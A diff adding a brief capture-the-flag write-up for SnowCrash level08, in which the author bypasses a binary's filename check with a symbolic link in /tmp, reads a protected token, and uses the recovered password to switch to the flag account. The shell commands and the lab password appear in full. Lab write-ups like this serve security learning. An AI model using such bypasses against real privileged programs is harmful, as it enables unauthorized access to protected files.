@@ -1,0 +1,25 @@
+as we started we found two files
+token and executable
+we tried to execute level08 but it said that it requires a file to read, I tried to read token, it says unaccessible
+
+level08@SnowCrash:~$ ls
+level08  token
+level08@SnowCrash:~$ ./level08 
+./level08 [file to read]
+level08@SnowCrash:~$ ./level08 token
+You may not access 'token'
+
+I tried to use cat
+level08@SnowCrash:~$ cat token 
+cat: token: Permission denied
+
+so I decided to make a symbolic link and then read the file, as I decompiled level08 executable and found that they parse the input to make sure it doesn't include the word token
+also I found out that it uses the same way of escalating privileges as the previous exercise
+
+level08@SnowCrash:~$ ln -s /home/user/level08/token /tmp/no && ./level08 /tmp/no
+quif5eloekouj29ke0vouxean
+level08@SnowCrash:~$ su flag08
+Password: 
+Don't forget to launch getflag !
+getflag
+XXXXXXXXXXXXXXXXXXXXXXXX
